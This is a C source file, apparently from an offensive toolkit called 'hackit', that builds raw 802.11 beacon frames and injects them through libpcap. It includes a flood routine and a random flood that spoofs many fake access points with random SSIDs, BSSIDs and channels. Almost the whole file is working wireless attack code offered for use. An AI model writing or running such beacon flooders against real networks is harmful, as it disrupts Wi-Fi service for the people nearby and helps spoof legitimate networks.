#include "beacon_flood.h"
#include "packet_injector.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#define HACKIT_SLEEP_MS(ms) Sleep((DWORD)(ms))
#else
#include <unistd.h>
#define HACKIT_SLEEP_MS(ms) usleep((useconds_t)(ms) * 1000)
#endif

#define BEACON_INTERVAL_TU 100
#define HACKIT_80211_RADIOTAP_LEN 12
#define HACKIT_80211_MGMT_HDR_LEN 24
#define HACKIT_80211_ADDR_LEN 6

/* ------------------------------------------------------------------ */

int hackit_build_beacon_frame(uint8_t* buf, size_t buf_len, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (!buf || !ssid || !bssid || buf_len < 128)
        return -1;

    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    int total = HACKIT_80211_RADIOTAP_LEN + HACKIT_80211_MGMT_HDR_LEN + 12 + 2 + ssid_len + 3;

    /* Add supported rates (8 bytes) + extended rates (4) */
    int rates_len = 8;
    int ext_rates_len = 4;
    total += 2 + rates_len;

    if ((size_t)total > buf_len)
        return -1;

    memset(buf, 0, (size_t)total);

    /* Radiotap */
    buf[2] = (uint8_t)(HACKIT_80211_RADIOTAP_LEN & 0xFF);
    buf[3] = (uint8_t)((HACKIT_80211_RADIOTAP_LEN >> 8) & 0xFF);

    /* Frame Control: Beacon (type=0, subtype=8) */
    buf[HACKIT_80211_RADIOTAP_LEN]     = 0x80;
    buf[HACKIT_80211_RADIOTAP_LEN + 1] = 0x00;

    /* Duration */
    buf[HACKIT_80211_RADIOTAP_LEN + 2] = 0x00;
    buf[HACKIT_80211_RADIOTAP_LEN + 3] = 0x00;

    /* Address 1 – broadcast */
    memset(&buf[HACKIT_80211_RADIOTAP_LEN + 4], 0xFF, HACKIT_80211_ADDR_LEN);
    /* Address 2 – BSSID */
    memcpy(&buf[HACKIT_80211_RADIOTAP_LEN + 10], bssid, HACKIT_80211_ADDR_LEN);
    /* Address 3 – BSSID */
    memcpy(&buf[HACKIT_80211_RADIOTAP_LEN + 16], bssid, HACKIT_80211_ADDR_LEN);

    int off = HACKIT_80211_RADIOTAP_LEN + HACKIT_80211_MGMT_HDR_LEN;

    /* Timestamp (8 bytes) – zero */
    off += 8;

    /* Beacon interval (2 bytes) */
    buf[off]     = (uint8_t)(BEACON_INTERVAL_TU & 0xFF);
    buf[off + 1] = (uint8_t)((BEACON_INTERVAL_TU >> 8) & 0xFF);
    off += 2;

    /* Capability info (2 bytes) – ESS + Short Preamble + Privacy */
    buf[off]     = 0x11;
    buf[off + 1] = 0x04;
    off += 2;

    /* SSID tag (ID=0) */
    buf[off]     = 0x00;
    buf[off + 1] = (uint8_t)ssid_len;
    memcpy(&buf[off + 2], ssid, (size_t)ssid_len);
    off += 2 + ssid_len;

    /* Supported Rates tag (ID=1) */
    buf[off]     = 0x01;
    buf[off + 1] = (uint8_t)rates_len;
    memset(&buf[off + 2], 0x82, (size_t)rates_len);
    off += 2 + rates_len;

    /* DS Parameter Set tag (ID=3, len=1) */
    buf[off]     = 0x03;
    buf[off + 1] = 0x01;
    buf[off + 2] = channel;
    off += 3;

    return off;
}

/* ------------------------------------------------------------------ */

#ifdef HACKIT_HAS_PCAP
#ifdef _WIN32
#include <pcap.h>
#else
#include <pcap/pcap.h>
#endif

static int inject_beacon_via_pcap(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    uint8_t buf[2048];
    int len = hackit_build_beacon_frame(buf, sizeof(buf), ssid, bssid, channel);
    if (len <= 0) return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    memset(errbuf, 0, sizeof(errbuf));

    pcap_t* handle = pcap_open_live(iface, 65535, 1, 100, errbuf);
    if (!handle) {
        fprintf(stderr, "[BEACON] pcap_open_live failed: %s\n", errbuf);
        return -1;
    }

#ifdef _WIN32
    pcap_datalink(handle, DLT_IEEE802_11_RADIO);
#else
    pcap_set_datalink(handle, DLT_IEEE802_11_RADIO);
#endif

    int ret = pcap_inject(handle, buf, (size_t)len);
    pcap_close(handle);

    if (ret != len) {
        fprintf(stderr, "[BEACON] pcap_inject returned %d (expected %d)\n", ret, len);
        return -1;
    }

    return 1;
}

int hackit_beacon_flood(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel, int count) {
    if (!iface || !ssid || !bssid)
        return -1;

    if (count <= 0) count = 10;

    int sent = 0;

    for (int i = 0; i < count; i++) {
        int ret = inject_beacon_via_pcap(iface, ssid, bssid, channel);
        if (ret > 0) {
            sent++;
        } else {
            fprintf(stderr, "[BEACON] Injection %d/%d failed\n", i + 1, count);
        }

        if (i < count - 1)
            HACKIT_SLEEP_MS(10);
    }

    printf("[BEACON] Flood complete: %d/%d beacons sent on '%s'\n", sent, count, iface);
    return sent;
}

int hackit_beacon_flood_random(const char* iface, int count) {
    if (!iface)
        return -1;

    if (count <= 0) count = 10;

    int sent = 0;
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    srand((unsigned int)(count ^ 0x1234));

    for (int i = 0; i < count; i++) {
        char ssid[33];
        int ssid_len = (rand() % 16) + 4;

        for (int j = 0; j < ssid_len; j++)
            ssid[j] = charset[rand() % (sizeof(charset) - 1)];
        ssid[ssid_len] = '\0';

        uint8_t bssid[6];
        bssid[0] = 0x02;
        bssid[1] = (uint8_t)(rand() % 256);
        bssid[2] = (uint8_t)(rand() % 256);
        bssid[3] = (uint8_t)(rand() % 256);
        bssid[4] = (uint8_t)(rand() % 256);
        bssid[5] = (uint8_t)(rand() % 256);

        uint8_t channel = (uint8_t)((rand() % 11) + 1);

        int ret = inject_beacon_via_pcap(iface, ssid, bssid, channel);
        if (ret > 0) {
            sent++;
        }

        if (i < count - 1)
            HACKIT_SLEEP_MS(5);
    }

    printf("[BEACON] Random flood complete: %d/%d beacons sent on '%s'\n", sent, count, iface);
    return sent;
}

#else /* !HACKIT_HAS_PCAP */

int hackit_beacon_flood(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel, int count) {
    (void)iface; (void)ssid; (void)bssid; (void)channel; (void)count;
    fprintf(stderr, "[BEACON] pcap not available. Install libpcap/Npcap for beacon flooding.\n");
    return -1;
}

int hackit_beacon_flood_random(const char* iface, int count) {
    (void)iface; (void)count;
    fprintf(stderr, "[BEACON] pcap not available. Install libpcap/Npcap for beacon flooding.\n");
    return -1;
}

#endif /* HACKIT_HAS_PCAP */
